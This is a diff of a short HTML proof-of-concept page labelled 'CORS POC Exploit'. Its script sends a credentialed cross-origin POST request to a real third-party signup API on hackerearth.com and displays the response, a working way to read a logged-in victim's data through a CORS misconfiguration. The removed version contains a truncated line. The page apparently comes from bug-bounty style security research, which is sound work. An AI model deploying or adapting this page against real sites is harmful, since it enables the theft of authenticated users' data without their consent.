@@ -1,26 +1,23 @@
-<!DOCTYPE html>
-<html>
-<head><title>error 404</title></head>
-<body>
-<center>
-<h2>CORs POC</h2>
-
-<textarea rows="10" cols="60" id="pwnz">
-</textarea><br>
+<!DOCTYPE html> 
+<html> 
+<body> 
+<center> 
+<h2>CORS POC Exploit</h2>
+<div id="demo"> 
 <button type="button" onclick="cors()">Exploit</button>
-</div>
-
-<script>
-function cors() {
-  var xhttp = new XMLHttpRequest();
-  xhttp.onreadystatechange = function() {
-    if (this.readyState == 4 && this.status == 200) {
-      document.getElementById("pwnz").innerHTML = this.responseText;
-    }
-  };
-  xhttp.open("POST", "https://www.hackerearth.com/api/v1/sparta/auth/signup/", true);
-  xht
-  xhttp.send();
+ </div>  
+<script> function cors() { 
+  var xhttp = new XMLHttpRequest(); 
+  xhttp.onreadystatechange = function()
+  {     
+    if (this.readyState == 4 && this.status == 200) { 
+            document.getElementById("demo").innerHTML = alert(this.responseText);
+     }   
+    };  
+   xhttp.open("POST", "https://www.hackerearth.com/api/v1/sparta/auth/signup/?sxhr=true&source=homepage", true);  
+   xhttp.withCredentials = true;  
+   xhttp.send(); 
 }
-</script>
-```
+</script> 
+</body> 
+</html>
